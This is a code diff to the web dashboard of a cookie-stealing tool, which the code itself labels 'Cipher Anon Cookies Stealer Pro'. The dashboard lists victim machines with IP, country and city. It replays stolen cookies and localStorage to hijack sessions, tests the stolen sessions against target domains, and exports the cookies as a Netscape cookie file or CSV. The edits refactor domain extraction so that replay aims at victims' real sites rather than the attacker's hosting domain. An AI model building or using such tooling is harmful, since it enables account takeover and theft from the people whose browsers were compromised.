+                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName.replace(/'/g, "\\'")}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
+                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName.replace(/'/g, "\\'")}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
+                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName.replace(/'/g, "\\'")}')">🔍 Test</button>
+                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName.replace(/'/g, "\\'")}')">📝</button>
+                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName.replace(/'/g, "\\'")}')">👁️</button>
                         </div>
                     </div>
                 `;
@@ -3061,7 +3218,7 @@
                 return;
             }
             let actualDomain = firstDomain;
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const cookieKeys = Object.keys(allCookies);
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
@@ -3070,7 +3227,7 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                     showToast('⚠️ No valid domain for replay', 'error');
                     return;
                 }
@@ -3121,7 +3278,7 @@
                 return;
             }
             let actualDomain = firstDomain;
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const storageKeys = Object.keys(allStorage);
                 for (const key of storageKeys) {
                     const parts = key.split(':');
@@ -3130,7 +3287,7 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                     showToast('⚠️ No valid domain for replay', 'error');
                     return;
                 }
@@ -3165,20 +3322,15 @@
             if (!pc) { showToast('❌ PC not found', 'error'); return; }
 
             let domain = Object.keys(pc.domains)[0];
-            if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
-                // Try to find a valid domain from cookies
+            if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
                 for (const entry of pc.entries) {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    for (const key of cookieKeys) {
-                        const parts = key.split('|');
-                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
-                            domain = parts[0];
-                            break;
-                        }
+                    const d = extractDomain(entry);
+                    if (d && d !== 'unknown' && !d.includes('railway.app')) {
+                        domain = d;
+                        break;
                     }
-                    if (domain && !domain.includes('railway.app') && domain !== 'unknown') break;
                 }
-                if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
+                if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
                     showToast('⚠️ No valid domain to test', 'error');
                     return;
                 }
@@ -3221,7 +3373,7 @@
             let totalStorage = 0;
 
             data.forEach((entry, idx) => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const domain = extractDomain(entry);
                 const ip = entry.ip || 'Unknown';
                 const country = entry.country || 'Unknown';
                 const city = entry.city || 'N/A';
@@ -3372,23 +3524,7 @@
 
             currentModalEntry = entry;
             const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-            let domain = entry.fingerprint?.hostname || entry.domain || '';
-            if (!domain || domain === pc || domain === 'unknown') {
-                const cookieKeys = Object.keys(entry.cookies || {});
-                if (cookieKeys.length > 0) {
-                    const cookieDomains = cookieKeys.map(k => {
-                        const parts = k.split('|');
-                        return parts.length > 1 ? parts[0] : null;
-                    }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
-                    if (cookieDomains.length > 0) {
-                        domain = cookieDomains[0];
-                    } else {
-                        domain = 'unknown';
-                    }
-                } else {
-                    domain = 'unknown';
-                }
-            }
+            const domain = extractDomain(entry);
             currentModalDomain = domain;
 
             const overlay = document.getElementById('modalOverlay');
@@ -3581,25 +3717,24 @@
             let cookies = {};
             let actualDomain = domain;
             allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                const entryDomain = extractDomain(entry);
+                if (entryDomain === domain) {
                     Object.assign(cookies, entry.cookies || {});
                     actualDomain = entryDomain;
                 }
             });
             if (Object.keys(cookies).length === 0) {
-                // Try to find cookies from any entry with this domain
                 for (const entry of allData) {
-                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
-                    if (entryDomain && entryDomain === domain) {
+                    const d = extractDomain(entry);
+                    if (d === domain) {
                         Object.assign(cookies, entry.cookies || {});
-                        actualDomain = entryDomain;
+                        actualDomain = d;
                         break;
                     }
                 }
             }
             if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const cookieKeys = Object.keys(cookies);
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
@@ -3608,7 +3743,7 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                     showToast('❌ No valid domain', 'error');
                     return;
                 }
@@ -3640,24 +3775,24 @@
             let storage = {};
             let actualDomain = domain;
             allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                const entryDomain = extractDomain(entry);
+                if (entryDomain === domain) {
                     Object.assign(storage, entry.localStorage || {});
                     actualDomain = entryDomain;
                 }
             });
             if (Object.keys(storage).length === 0) {
                 for (const entry of allData) {
-                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
-                    if (entryDomain && entryDomain === domain) {
+                    const d = extractDomain(entry);
+                    if (d === domain) {
                         Object.assign(storage, entry.localStorage || {});
-                        actualDomain = entryDomain;
+                        actualDomain = d;
                         break;
                     }
                 }
             }
             if (Object.keys(storage).length === 0) { showToast('❌ No storage found', 'error'); return; }
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const storageKeys = Object.keys(storage);
                 for (const key of storageKeys) {
                     const parts = key.split(':');
@@ -3666,7 +3801,7 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                     showToast('❌ No valid domain', 'error');
                     return;
                 }
@@ -3714,14 +3849,14 @@
             let cookies = {};
             let actualDomain = domain;
             allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                const entryDomain = extractDomain(entry);
+                if (entryDomain === domain) {
                     Object.assign(cookies, entry.cookies || {});
                     actualDomain = entryDomain;
                 }
             });
             if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                 const cookieKeys = Object.keys(cookies);
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
@@ -3730,7 +3865,7 @@
                         break;
                     }
                 }
-                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                     showToast('⚠️ No valid domain', 'error');
                     return;
                 }
@@ -3754,18 +3889,8 @@
             container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
             const domains = new Set();
             allData.forEach(entry => {
-                let domain = entry.fingerprint?.hostname || entry.domain || '';
-                if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
-                    const cookieKeys = Object.keys(entry.cookies || {});
-                    for (const key of cookieKeys) {
-                        const parts = key.split('|');
-                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
-                            domain = parts[0];
-                            break;
-                        }
-                    }
-                }
-                if (domain && !domain.includes('railway.app') && !domain.includes('up.railway') && domain !== 'unknown') {
+                let domain = extractDomain(entry);
+                if (domain && !domain.includes('railway.app') && domain !== 'unknown') {
                     domains.add(domain);
                 }
             });
@@ -3881,7 +4006,7 @@
             let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
             allData.forEach(entry => {
                 const cookies = entry.cookies || {};
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const domain = extractDomain(entry);
                 const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
                 Object.entries(cookies).forEach(([name, value]) => {
                     const expiry = Math.floor(Date.now() / 1000) + 31536000;
@@ -3905,7 +4030,7 @@
             let rows = ['PC,Domain,Cookie Name,Cookie Value,IP,Country,Time'];
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                const domain = extractDomain(entry);
                 const cookies = entry.cookies || {};
                 Object.entries(cookies).forEach(([name, value]) => {
                     rows.push(`"${pc}","${domain}","${name}","${value.replace(/"/g, '""')}","${entry.ip || ''}","${entry.country || ''}","${entry.receivedAt || ''}"`);
@@ -3941,21 +4066,11 @@
         function downloadDomain(domain) {
             let cookies = {};
             allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                const entryDomain = extractDomain(entry);
+                if (entryDomain === domain) {
                     Object.assign(cookies, entry.cookies || {});
                 }
             });
-            if (Object.keys(cookies).length === 0) {
-                // Try with just domain match
-                for (const entry of allData) {
-                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
-                    if (entryDomain && entryDomain === domain) {
-                        Object.assign(cookies, entry.cookies || {});
-                        break;
-                    }
-                }
-            }
             if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
             const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
             const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
@@ -4208,6 +4323,7 @@
                 closeSidebar();
                 hideLogoutConfirm();
                 hideCustomConfirm();
+                closeRename();
             }
         });
 
